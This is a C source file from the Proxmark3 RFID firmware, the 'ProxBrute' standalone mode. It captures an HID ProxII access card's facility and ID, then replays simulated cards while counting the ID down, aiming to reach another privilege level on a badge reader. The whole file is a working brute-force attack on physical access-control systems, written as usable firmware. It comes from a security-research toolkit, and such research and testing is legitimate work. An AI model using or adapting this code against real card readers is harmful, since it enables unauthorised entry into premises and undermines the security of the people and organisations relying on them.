//-----------------------------------------------------------------------------
// Copyright (C) Brad Antoniewicz 2011
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
// main code for LF aka Proxbrute by Brad antoniewicz
//-----------------------------------------------------------------------------
#include "standalone.h" // standalone definitions
#include "proxmark3_arm.h"
#include "appmain.h"
#include "fpgaloader.h"
#include "util.h"
#include "dbprint.h"
#include "ticks.h"
#include "lfops.h"

void ModInfo(void) {
    DbpString("  LF HID ProxII bruteforce - aka Proxbrute (Brad Antoniewicz)");
}

// samy's sniff and repeat routine for LF
void RunMod(void) {
    StandAloneMode();
    Dbprintf(">>  LF HID proxII bruteforce a.k.a ProxBrute Started (Brad Antoniewicz) <<");
    FpgaDownloadAndGo(FPGA_BITSTREAM_LF);

    uint32_t high, low;

#define STATE_READ  0
#define STATE_BRUTE 1

    uint8_t state = STATE_READ;

    for (;;) {

        WDT_HIT();

        // exit from SamyRun,   send a usbcommand.
        if (data_available()) break;

        // Was our button held down or pressed?
        int button_pressed = BUTTON_HELD(280);
        if (button_pressed != BUTTON_HOLD)
            continue;

        // Button was held for a second, begin recording
        if (state == STATE_READ) {

            LEDsoff();
            LED_A_ON();
            WAIT_BUTTON_RELEASED();

            DbpString("[=] starting recording");

            // findone, high, low
            lf_hid_watch(1, &high, &low, true);

            Dbprintf("[=]   recorded | %x%08x", high, low);

            // got nothing. blink and loop.
            if (high == 0 && low == 0) {
                SpinErr(LED_A, 100, 12);
                DbpString("[=] only got zeros, retry recording after click");
                continue;
            }

            SpinErr(LED_A, 250, 2);
            state = STATE_BRUTE;
            continue;

        } else if (state == STATE_BRUTE) {

            LED_C_ON();   // Simulate
            WAIT_BUTTON_RELEASED();


            /*
              ProxBrute - brad a. - foundstone

              Following code is a trivial brute forcer once you read a valid tag
              the idea is you get a valid tag, then just try and brute force to
              another priv level. The problem is that it has no idea if the code
              worked or not, so its a crap shoot. One option is to time how long
              it takes to get a valid ID then start from scratch every time.
            */
            DbpString("[=] entering ProxBrute mode");
            Dbprintf("[=] simulating | %08x%08x", high, low);

            for (uint16_t i = low - 1; i > 0; i--) {

                if (data_available()) break;

                // Was our button held down or pressed?
                button_pressed = BUTTON_HELD(280);
                if (button_pressed != BUTTON_HOLD) break;

                Dbprintf("[=] trying Facility = %08x ID %08x", high, i);

                // high, i, ledcontrol,  timelimit 20000
                CmdHIDsimTAGEx(0, high, i, 0, false, 20000);

                SpinDelay(100);
            }

            state = STATE_READ;
            SpinErr((LED_A | LED_C), 250, 2);
            LEDsoff();
        }
    }

    SpinErr((LED_A | LED_B | LED_C | LED_D), 250, 5);
    DbpString("[=] You can take the shell back :) ...");
    LEDsoff();
}
